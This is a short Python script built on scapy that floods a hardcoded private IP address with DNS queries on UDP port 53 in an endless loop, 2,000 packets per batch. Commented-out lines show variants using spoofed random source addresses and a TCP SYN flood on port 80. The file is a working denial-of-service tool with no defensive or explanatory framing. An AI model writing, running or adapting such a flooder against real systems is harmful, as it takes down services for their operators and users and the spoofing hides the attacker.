import scapy.all as scapy
from multiprocessing import Pool
import os

def DNS_Flood():

	clear = os.system('clear')
	#s = scapy.RandString(scapy.RandNum(1,10))
	#s1 ='www'
		#print(s1)
	#a = scapy.RandNum(1,10)
	#print(a)
	#s2 = scapy.RandString(scapy.RandNum(1,5))
	#s2 = s2.lower()
	#s2 = str(s2)
	#s2 = s2[2:-1]
	#print(s2)
	#process_id =process_id

	#s3 = 'com'

	#s = s1+'.'+s2+'.'+s3
	#print("Please input target's IP:") 
	#target = input("[DNS_Flood]#")
	#target = "172.16.4.80"
	#src_ip = scapy.RandIP()
	#print(s)
	num = 0
	try:
		while True:
			packet = scapy.IP(dst="172.16.4.80")/scapy.UDP(sport=scapy.RandShort(),dport=53)/scapy.DNS(rd=1,qd=scapy.DNSQR(qname="www.flood.com"))
			#packets = scapy.IP(src=src_ip,dst=target)/scapy.UDP(sport=scapy.RandShort(),dport=53)/scapy.DNS(rd=1,qd=scapy.DNSQR(qname="www.flood.com"))
			#packet =scapy.IP(src=src_ip,dst=target)/scapy.TCP(dport=80,flags="S")
			#scapy.srflood(packet)
			scapy.send(packet,count=2000,verbose=False)
			#scapy.send(packets,verbose=False)
			num += 1

			#if num == 1000:
			#print("%s,%s"%(name,num))
			print(num)
	except KeyboardInterrupt:
		print("[-] Ctrl + C detected.....")

DNS_Flood()

